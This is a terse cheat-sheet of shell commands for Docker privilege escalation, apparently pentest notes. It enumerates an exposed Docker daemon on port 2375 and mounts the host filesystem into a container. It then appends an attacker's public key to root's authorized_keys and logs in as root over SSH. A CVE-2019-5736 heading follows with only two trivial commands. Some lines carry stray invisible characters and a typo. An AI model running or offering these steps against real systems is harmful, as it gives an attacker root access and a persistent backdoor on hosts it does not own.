Docker Privilege Escalation

```
ifconfig
docker​ ​ps
​netstat -lntp
docker -H 127.0.0.1:2375 ps
​docker -H 127.0.0.1:2375 container ls
​docker -H 127.0.0.1:2375 plugin ls
docker -H 127.0.0.1:2375 stack ls
docker -H 127.0.0.1:2375 service ls
docker -H 127.0.0.1:2375 system info
ocker -H 127.0.0.1:2375 volume ls
docker -H 127.0.0.1:2375 container ls
​docker -H 127.0.0.1:2375 images
docker -H 127.0.0.1:2375 run --rm -itv /:/host ubuntu /bin/bash 
​mkdir /host/root/.ssh/
​echo "​[PUBLIC_KEY]​" >> /host/root/.ssh/authorized_keys
ssh -i /root/key root@192.168.​X​.209
```

### CVE-2019-5736
```
docker container ls
docker exec -it 3b020c52c09d sh
```
